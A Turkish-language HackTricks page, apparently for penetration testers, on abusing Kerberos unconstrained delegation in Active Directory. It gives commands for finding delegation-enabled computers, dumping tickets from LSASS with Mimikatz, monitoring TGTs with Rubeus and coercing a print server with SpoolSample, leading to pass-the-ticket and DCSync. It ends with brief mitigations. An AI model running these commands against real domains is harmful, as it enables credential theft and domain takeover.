# Sınırsız Delege Etme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) sahip olun
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

## Sınırsız delege etme

Bu, bir **Etki Alanı Yöneticisi'nin** etki alanı içindeki herhangi bir **Bilgisayara** ayarlayabileceği bir özelliktir. Ardından, bir **kullanıcı oturum açtığında**, o kullanıcının **TGT'nin bir kopyası** DC tarafından sağlanan TGS içinde **gönderilecek ve LSASS'ta belleğe kaydedilecektir**. Bu nedenle, makinede Yerel Yönetici ayrıcalıklarına sahipseniz, biletleri dökerek ve kullanıcıları taklit ederek herhangi bir makinede işlem yapabilirsiniz.

Bu nedenle, bir etki alanı yöneticisi "Sınırsız Delege Etme" özelliği etkinleştirilmiş bir Bilgisayara oturum açarsa ve o makinede yerel yönetici ayrıcalıklarına sahipseniz, biletleri dökerek ve Etki Alanı Yöneticisini herhangi bir yerde taklit edebilirsiniz (etki alanı yükseltme).

Bu özelliği içeren **Bilgisayar nesnelerini bulabilirsiniz**, [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) özniteliğinin [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) içerip içermediğini kontrol ederek. Powerview bunu şu şekilde yapar: ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresi ile:

<pre class="language-bash"><code class="lang-bash"># Sınırsız bilgisayarları listele
## Powerview
Get-NetComputer -Unconstrained #DC'ler her zaman görünür ancak etki alanı yükseltme için kullanışlı değildir
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatz ile biletleri dök
</strong>privilege::debug
sekurlsa::tickets /export #Tavsiye edilen yol
kerberos::list /export #Başka bir yol

# Oturum açmaları izle ve yeni biletleri dök
.\Rubeus.exe monitor /targetuser:&#x3C;kullanıcıadı> /interval:10 #Her 10 saniyede yeni TGT'leri kontrol et</code></pre>

Yönetici (veya kurban kullanıcı) biletini belleğe **Mimikatz** veya **Rubeus** ile yükle **Pass the Ticket** için.\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team'da Sınırsız delege etme hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Zorunlu Kimlik Doğrulama**

Bir saldırgan, "Sınırsız Delege Etme" için izin verilen bir bilgisayarı **ele geçirebilirse**, bir **Yazıcı sunucusunu** otomatik olarak **giriş yapmaya kandırabilir** ve sunucunun belleğinde bir TGT kaydedebilir.\
Ardından, saldırgan, kullanıcı Yazıcı sunucusu bilgisayar hesabını taklit etmek için bir **Pass the Ticket saldırısı** gerçekleştirebilir.

Bir yazıcı sunucusunun herhangi bir makineye giriş yapmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Eğer TGT bir etki alanı denetleyicisinden geliyorsa, bir [**DCSync saldırısı**](acl-persistence-abuse/#dcsync) gerçekleştirebilir ve DC'den tüm karma değerlerini elde edebilirsiniz.\
[**Bu saldırı hakkında daha fazla bilgi için ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**İşte kimlik doğrulamayı zorlamak için başka yollar:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Hafifletme

* DA/Yönetici girişlerini belirli hizmetlere sınırlayın
* Ayrıcalıklı hesaplar için "Hesap hassas ve devredilemez" olarak ayarlayın.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
